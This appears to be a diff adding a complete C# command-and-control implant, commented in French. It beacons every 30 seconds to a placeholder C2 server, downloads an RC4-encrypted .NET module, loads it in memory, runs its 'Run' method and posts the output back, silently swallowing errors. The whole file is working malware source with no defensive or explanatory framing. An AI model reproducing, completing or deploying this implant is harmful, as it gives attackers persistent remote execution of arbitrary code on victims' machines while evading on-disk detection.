@@ -1,0 +1,69 @@
+//  (beacon + loader)
+// Ce programme envoie un beacon HTTP POST, reçoit un module chiffré RC4, l'exécute en mémoire et retourne la sortie
+
+using System;
+using System.Net.Http;
+using System.Reflection;
+using System.Text;
+using System.Threading.Tasks;
+
+class HttpC2Agent
+{
+    static readonly string c2Url = "http://YOUR_C2_SERVER/api/beacon"; // à remplacer
+    static readonly string rc4Key = "MySecretKey123";
+
+    static async Task Main()
+    {
+        while (true)
+        {
+            try
+            {
+                string beaconData = "BEACON";
+                using HttpClient client = new HttpClient();
+                var content = new StringContent(beaconData, Encoding.UTF8, "text/plain");
+                HttpResponseMessage response = await client.PostAsync(c2Url, content);
+
+                byte[] encryptedModule = await response.Content.ReadAsByteArrayAsync();
+                if (encryptedModule.Length > 0)
+                {
+                    byte[] decrypted = RC4(encryptedModule, Encoding.ASCII.GetBytes(rc4Key));
+                    Assembly asm = Assembly.Load(decrypted);
+                    foreach (var type in asm.GetTypes())
+                    {
+                        var m = type.GetMethod("Run", BindingFlags.Static | BindingFlags.Public);
+                        if (m != null)
+                        {
+                            var result = m.Invoke(null, null)?.ToString();
+                            await client.PostAsync(c2Url, new StringContent(result ?? "", Encoding.UTF8, "text/plain"));
+                            break;
+                        }
+                    }
+                }
+            }
+            catch { }
+            await Task.Delay(30000); // 30 sec beacon interval
+        }
+    }
+
+    static byte[] RC4(byte[] data, byte[] key)
+    {
+        byte[] s = new byte[256];
+        for (int i = 0; i < 256; i++) s[i] = (byte)i;
+        int j = 0;
+        for (int i = 0; i < 256; i++)
+        {
+            j = (j + s[i] + key[i % key.Length]) & 255;
+            (s[i], s[j]) = (s[j], s[i]);
+        }
+        int a = 0, b = 0;
+        byte[] result = new byte[data.Length];
+        for (int k = 0; k < data.Length; k++)
+        {
+            a = (a + 1) & 255;
+            b = (b + s[a]) & 255;
+            (s[a], s[b]) = (s[b], s[a]);
+            result[k] = (byte)(data[k] ^ s[(s[a] + s[b]) & 255]);
+        }
+        return result;
+    }
+}
